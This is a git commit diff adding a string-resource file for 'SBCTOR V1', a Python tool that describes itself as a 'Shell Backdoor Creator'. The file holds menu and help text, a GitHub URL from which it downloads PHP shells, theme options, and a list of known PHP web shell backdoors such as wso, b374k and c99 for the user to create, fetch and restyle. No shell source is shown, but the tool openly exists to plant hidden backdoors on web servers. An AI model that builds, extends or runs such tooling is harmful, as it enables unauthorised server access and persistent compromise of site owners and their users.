397fe90f1afcfaae7ba6cc7e71f8b44012adaee8
Ubaii <31325580+Ubaii@users.noreply.github.com>
2020-05-23 16:27:55 +0700

    v1
    Update ntar y

---
+++ dist/string.py
@@ -0,0 +1,81 @@
+# STRING FOR SBCTOR V1
+import os
+
+ts = "[!]"
+url = "https://raw.githubusercontent.com/Ubaii/server-lenong/master/lokal/"
+pathd = "usr/downloaded/"
+ext = ".php"
+clear = os.system('cls' if os.name=='nt' else 'clear')
+
+# HELP STRING
+sc = "SBCTOR V1 -> Shell Backdoor Creator"
+title = "SBCTOR V1 -> Shell Backdoor Creator. By Ubaii ID"
+c = "Create A New Shell Backdoor"
+d = "Download A Shell Backdoor"
+l = "Show All Shell"
+f = "CUSTOMATION A SHELL"
+h = "Display this message and exit."
+helps = "python sbctor.py -h For Displaying HelpPage"
+ds = "Download Success!!"
+lc = "Shell Located :"
+pc = "AFTER CREATING SHELL, YOU CAN CUSTOMATION THAT SHELL!"
+hc = "Command : python sbctor.py -e [name of file]"
+fo = "Force Close Detected!"
+menu = """
+====================
+1. BACKGROUND LOGIN (Default black)
+2. THEME COLOR (Default Green)
+3. TITLE (LOGIN)
+4. TITLE (DASHBOARD)
+5. COPYRIGHT
+====================
+"""
+
+# STRING FOR EDIT THEME!
+theme1 = """        border-bottom: 2px solid green;\n
+		border-top: 2px solid green;\n
+		border-right: 2px solid green;\n
+		border-left: 2px solid green;\n"""
+
+menut = """
+     PLEASE SELECT THEME
+===============================
+1. RED WITH BLACK BACKGROUND
+2. BLUE WITH BLACK BACKGROUND
+3. GREEN WITH BLACK BACKGROUND
+4. CYAN WITH BLACK BACKGROUND
+5. WHITE WITH BLACK BACKGROUND
+===============================
+6. DARK+
+7. DARK
+8. MONOKAI
+9. NIGHT BLUE
+10. CANCEL CUSTOMATION SHELL
+==============================="""
+
+menus = """
+    LIST SHELL :
+    id13372
+    wso
+    b374k
+    berandal
+    bypassac
+    c99
+    jancox
+    jembut
+    idx2
+    idx3
+    bpshell
+    brudul
+    hckf
+    lonte
+    min-noname
+    terserah
+    sbis
+    sbh
+    cumma
+    bajax
+    """
+
+by = '	echo "<center><font color="red">Recoded IndoXploit And All Shell By Cerberus";'
+defaultc = '	echo "<center>Copyright &copy; ".date("Y")." - <a href="http://exploit1337.blogspot.co.id/" target="_blank"><font color=red>EXPLOIT1337</font></a></center>";'
